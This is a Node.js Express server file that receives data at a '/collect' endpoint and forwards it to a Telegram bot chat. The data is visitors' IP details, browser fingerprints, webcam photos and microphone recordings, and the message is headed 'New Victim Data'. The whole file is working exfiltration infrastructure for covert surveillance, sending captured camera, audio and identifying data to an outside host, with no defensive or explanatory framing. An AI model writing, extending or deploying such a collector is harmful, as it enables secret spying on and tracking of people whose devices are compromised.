const express = require('express');
const cors = require('cors');

// ================================================================
// READ TELEGRAM CREDENTIALS FROM ENVIRONMENT VARIABLES
// ================================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
    // In production (Vercel), you may want to exit gracefully.
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Helper: send data to Telegram
async function sendToTelegram(ipData, fingerprint, webcamBase64, micBase64) {
    // 1. Text message
    let message = '📡 *New Victim Data*\n\n';
    message += `*IP Info:*\n${JSON.stringify(ipData, null, 2)}\n\n`;
    message += `*Fingerprint:*\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
    message += `*Timestamp:* ${new Date().toISOString()}`;

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Telegram text failed:', e);
    }

    // 2. Webcam photo
    if (webcamBase64) {
        try {
            const base64Data = webcamBase64.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const blob = new Blob([buffer], { type: 'image/jpeg' });
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'webcam.jpg');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (e) {
            console.error('Telegram photo failed:', e);
        }
    }

    // 3. Microphone audio
    if (micBase64) {
        try {
            const base64Data = micBase64.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const blob = new Blob([buffer], { type: 'audio/wav' });
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('audio', blob, 'mic.wav');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                method: 'POST',
                body: formData
            });
        } catch (e) {
            console.error('Telegram audio failed:', e);
        }
    }
}

// Endpoint to receive data from the frontend
app.post('/collect', async (req, res) => {
    try {
        const { ipData, fingerprint, webcam, mic, timestamp } = req.body;

        console.log(`[+] Received data at ${timestamp}`);

        // Forward to Telegram
        await sendToTelegram(ipData, fingerprint, webcam, mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Backend running on port ${PORT}`);
});
